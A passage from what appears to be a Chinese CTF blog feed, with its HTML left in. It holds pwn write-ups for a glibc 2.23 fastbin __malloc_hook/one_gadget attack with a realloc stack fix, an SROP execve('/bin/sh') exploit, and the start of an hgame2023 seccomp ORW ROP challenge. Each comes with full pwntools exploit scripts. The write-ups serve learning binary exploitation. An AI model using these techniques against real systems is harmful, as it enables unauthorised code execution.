class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7ff4f33beb78</span>-<span class="number">0x7ff4f2ffa000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这样我们获得了一个free chunk的指针 即chunk2</p><p>可以用其修改fd域 从而获得任意地址写的机会 因为libc版本是2.23 所以这里用malloc_hook_attack</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4526a</span></span><br><span class="line">realloc_addr = libc_addr + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">payload = cyclic(<span class="number">0x13</span>)+p64(onegadget_addr)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>按理来说这道题到这里就结束了 但是你会发现几个onegadget都不行 这是因为onegadget所要求的栈空间并不满足的问题</p><p>这时候两种办法 一种是hgame2023的一题中利用到的double free也能触发malloc_hook 详细解释和手法可以去看我对应的wp</p><p>还有一种办法是利用realloc来实现 下面详细介绍一下</p><p>realloc函数是用于重新分配之前被分配过的chunk空间 其也有realloc_hook 并且也类似于malloc_hook 如果不为0则调用</p><p>关键在于两点 一是realloc_hook和malloc_hook相邻 也意味着我们可以同时修改二者</p><p>第二点在于realloc调用的时候会进行大量的push操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000846C0                 public realloc</span><br><span class="line">.text:00000000000846C0 realloc         proc near               ; CODE XREF: _realloc↑j</span><br><span class="line">.text:00000000000846C0                                         ; DATA XREF: LOAD:0000000000006BA0↑o ...</span><br><span class="line">.text:00000000000846C0</span><br><span class="line">.text:00000000000846C0 var_60          = qword ptr -60h</span><br><span class="line">.text:00000000000846C0 var_58          = byte ptr -58h</span><br><span class="line">.text:00000000000846C0 var_48          = byte ptr -48h</span><br><span class="line">.text:00000000000846C0</span><br><span class="line">.text:00000000000846C0 ; __unwind &#123;</span><br><span class="line">.text:00000000000846C0                 push    r15             ; Alternative name is &#x27;__libc_realloc&#x27;</span><br><span class="line">.text:00000000000846C2                 push    r14</span><br><span class="line">.text:00000000000846C4                 push    r13</span><br><span class="line">.text:00000000000846C6                 push    r12</span><br><span class="line">.text:00000000000846C8                 mov     r13, rsi</span><br><span class="line">.text:00000000000846CB                 push    rbp</span><br><span class="line">.text:00000000000846CC                 push    rbx</span><br><span class="line">.text:00000000000846CD                 mov     rbx, rdi</span><br><span class="line">.text:00000000000846D0                 sub     rsp, 38h</span><br><span class="line">.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:00000000000846DB                 mov     rax, [rax]</span><br><span class="line">.text:00000000000846DE                 test    rax, rax</span><br><span class="line">.text:00000000000846E1                 jnz     loc_848E8</span><br><span class="line">.text:00000000000846E7                 test    rsi, rsi</span><br><span class="line">.text:00000000000846EA                 jnz     short loc_846F5</span><br><span class="line">.text:00000000000846EC                 test    rdi, rdi</span><br><span class="line">.text:00000000000846EF                 jnz     loc_84960</span><br></pre></td></tr></table></figure><p>所以可以修改我们的栈空间 使其符合条件(如果可以的话)</p><p>我们先使用gdb动调看一下 onegadget的条件没有被满足时 对应的栈空间</p><p>调试exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25622)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;buu_libc_ubuntu16_64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>)+<span class="string">b&#x27;\xe1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7ff4f33beb78</span>-<span class="number">0x7ff4f2ffa000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4526a</span></span><br><span class="line">realloc_addr = libc_addr + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">payload = cyclic(<span class="number">0xb</span>+<span class="number">0x8</span>)+p64(onegadget_addr)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *$rebase(0xccc)&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p>此时断点打在calloc函数调用时 我们一步步s下去</p><p><a href="https://pic.imgdb.cn/item/63d7ba18face21e9ef4c9f79.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7ba18face21e9ef4c9f79.png"></a></p><p><a href="https://pic.imgdb.cn/item/63d7ba36face21e9ef4cd42d.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7ba36face21e9ef4cd42d.png"></a></p><p><a href="https://pic.imgdb.cn/item/63d7ba5bface21e9ef4d1272.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7ba5bface21e9ef4d1272.png"></a></p><p>此时进行了一个逻辑与操作 如果rax寄存器的值为0 那么逻辑与的结果为1 </p><p>而jne指令当ZF零标志为0的时候 则会跳转 此时rax的值是一个地址 所以会执行jne跳转 我们继续跟进</p><p><a href="https://pic.imgdb.cn/item/63d7c26aface21e9ef5c7bac.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7c26aface21e9ef5c7bac.png"></a></p><p>此时call rax 再次跟进</p><p><a href="https://pic.imgdb.cn/item/63d7c2b9face21e9ef5d29b3.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7c2b9face21e9ef5d29b3.png"></a></p><p>这一步也就是onegadget判断栈结构的关键了 可以看到esp+0x30处并不等于NULL 所以onegadget执行失败</p><p>那么为什么我们改良后 通过realloc来调整栈结构的payload是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cyclic(<span class="number">0xb</span>)+p64(onegadget_addr)+p64(realloc_addr+<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>我们来看看malloc_hook内存地址附近的情况</p><p><a href="https://pic.imgdb.cn/item/63d7ce27face21e9ef75b146.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7ce27face21e9ef75b146.png"></a></p><p>可以看到往低地址偏移0x8处是realloc_hook 这也就意味着如果我们按照上面的payload覆写 那么此时程序的执行流程为</p><p><a href="https://pic.imgdb.cn/item/63d7d033face21e9ef79eb8c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7d033face21e9ef79eb8c.png"></a></p><p>因此凭借着readlloc在执行前会进行的push入栈操作 可以实现栈结构调节</p><p>不过由于本地和远程以及许多因素 建议还是直接试realloc_addr+x的偏移</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25622)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;buu_libc_ubuntu16_64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>)+<span class="string">b&#x27;\xe1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7ff4f33beb78</span>-<span class="number">0x7ff4f2ffa000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4526a</span></span><br><span class="line">realloc_addr = libc_addr + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">payload = cyclic(<span class="number">11</span>)+p64(onegadget_addr)+p64(realloc_addr+<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SROP</title>
      <link href="/2023/01/27/SROP/"/>
      <url>/2023/01/27/SROP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>一种独特的rop手法 利用了64位Linux的系统调用号15的<strong>rt_sigreturn</strong>函数</p><p>Linux系统中 信号实际上就是软中断 比如用户在终端输入了ctrl+c 就会终止终端 这时候就需要信号机制</p><p>软中断在计组原理中有所提及 这里不重复说明</p><p>每一个信号都有自己的名称和编号 对应着不同的功能 可以使用kill -l来查看</p><p><a href="https://pic.imgdb.cn/item/63d37241face21e9efab5b65.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d37241face21e9efab5b65.png"></a></p><p>而今天要利用的rt_sigreturn函数就是linux中多种信号的一个</p><p>rt_sigreturn - 从信号处理函数返回，并清除栈帧</p><p>当linux内核确定某进程还有一个未阻塞的信号待处理 当进程下一次从内核态切换到用户态时（比如进行系统调用后 或者是进程重新调度到cpu上）</p><p>它会创建用户空间堆栈 或定义的备用堆栈上的一个栈帧 用于保存各种进程上下文</p><p><a href="https://pic.imgdb.cn/item/63d37506face21e9efb22f8c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d37506face21e9efb22f8c.png"></a></p><p>如图所示 其中最关键的就是寄存器的值也会保存在栈上 借助这一点 我们可以很轻易的实现寄存器值的修改 从而实现系统调用</p><p>这一段内存被称为<strong>Signal Frame</strong></p><p>下面来看一道例题 buuctf中的ciscn_2019_es_7</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>保护机制很常规 看一下ida</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数跳转到了vuln函数 </p><p>vuln函数有栈溢出的机会 同时还给了write函数输出0x30字节的数据</p><p>程序还给了gadget函数 伪代码看不出什么 看一下汇编</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004D6                 public gadgets</span><br><span class="line">.text:00000000004004D6 gadgets         proc near</span><br><span class="line">.text:00000000004004D6 ; __unwind &#123;</span><br><span class="line">.text:00000000004004D6                 push    rbp</span><br><span class="line">.text:00000000004004D7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004004DA                 mov     rax, 0Fh</span><br><span class="line">.text:00000000004004E1                 retn</span><br><span class="line">.text:00000000004004E1 gadgets         endp ; sp-analysis failed</span><br><span class="line">.text:00000000004004E1</span><br></pre></td></tr></table></figure><p>有mov rax，0xf 显然这题就是要利用rt_sigreturn进行srop来实现system系统调用</p><p>不过要实现system(“&#x2F;bin&#x2F;sh”)首先我们还需要给rdi赋值binsh字符串的地址</p><p>由于题目没有自带binsh 此时有两种办法 一种是泄露libc基址 我们自己计算 还有一种是把binsh写到栈上 然后利用write函数泄露栈地址</p><p>gdb动调后发现泄露不到libc基址 所以这里用第二种办法 先gdb动调看一下哪里可以泄露栈地址</p><p><a href="https://pic.imgdb.cn/item/63d378c9face21e9efbc420a.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d378c9face21e9efbc420a.png"></a></p><p>我们输入的8字节的字母a位于0x7fffffffdeb0处 而0x7fffffffded0处有一个0x7fffffffdfc8的栈地址可以泄露</p><p>我们可以计算偏移 得到栈上的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,27954)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./buu_libc_ubuntu18_64&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ED</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)<span class="comment">#+p64(vuln_addr)</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x118</span></span><br></pre></td></tr></table></figure><p>此时的stack_addr就是我们通过read函数输入的第一个字长的数据的地址 如果我们将其替换成binsh 那么就是binsh字符串的地址</p><p>接下来就是伪造<strong>Signal Frame</strong>了 pwntools自带了库可以实现</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = stack_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_addr</span><br></pre></td></tr></table></figure><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,27954)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./buu_libc_ubuntu18_64&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ED</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(vuln_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x118</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">rax15_addr = <span class="number">0x4004DA</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = stack_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+cyclic(<span class="number">0x8</span>)+p64(rax15_addr)+p64(syscall_addr)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hgame2023</title>
      <link href="/2023/01/10/hgame2023/"/>
      <url>/2023/01/10/hgame2023/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a><em>orw</em></h3><p><em>以前没做过构造rop链的orw 记录一下</em></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/vuln&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><em>保护没啥值得留意的 直接ida打开看一下main函数</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  sandbox();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>开了沙盒 不出意外应该是禁用了execve 而system(“&#x2F;bin&#x2F;sh”)也是基于execve实现的 所以这里没有办法像以往一样简单的获取shell</em></p><p><em>seccomp-tools dump .&#x2F;vuln</em></p><p><em>查看一下是否如同猜想的一样</em></p><p><em><a href="https://pic.imgdb.cn/item/63bd04ddbe43e0d30e421730.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bd04ddbe43e0d30e421730.png"></a></em></p><p><em>当调用的函数为execve时进入0004 也就是return kill 禁止调用</em></p><p><em>那么跟进一下vuln函数</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x130</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>可以进行一次栈溢出 但是溢出的字节数只有0x28（还有8字节要给ebp）</em></p><p><em>显然这点溢出长度只够我们泄露libc基址 但是由于被禁用了execve system和onegadget都用不了了</em></p><p><em>但是如果想用orw的话 很明显 read和open需要的溢出长度远超过0x28</em></p><p><em>溢出长度不够的情况一般两种解决办法 自己构造一次read 修改rdx的值 使得溢出长度足够 或者是构造一次read 往bss段写入rop链 随后栈迁移</em></p><p><em>但是总归都是要自己调用read 并且我们还需要pop rsi pop rdx的指令地址 但是由于大部分的题目是动态链接 很难找到单独的rsi和rdx 本题也是没有的 这个时候你要想起来 题目所给的libc文件也是可以用ROPgadget查找指令地址的  只不过使用其指令还需要我们泄露libc基址</em></p><p><em>那么初步的思路确定了 就可以开始第一步 先泄露基址</em> </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31773</span>)</span><br><span class="line">rdi_addr = <span class="number">0x401393</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x401391</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = <span class="number">0x401070</span></span><br><span class="line">main_addr = <span class="number">0x4012f0</span></span><br><span class="line">read_plt = <span class="number">0x401080</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">bss_addr = <span class="number">0x404090</span>+<span class="number">0x50</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x108</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p><em>接下来是构造read read函数需要三个参数 rdi 控制第一个参数文件描述符 rsi控制写入地址 rdx控制写入字节数</em></p><p><em>但是很明显0x28的溢出长度是不够我们构造如此多的参数 那么我们可以gdb动调看一下 如果我们不对这三个寄存器动任何手脚 其分别值为多少</em></p><p><em><a href="https://pic.imgdb.cn/item/63bd0a8bbe43e0d30e4c5e16.png" class="gallery-item"><img 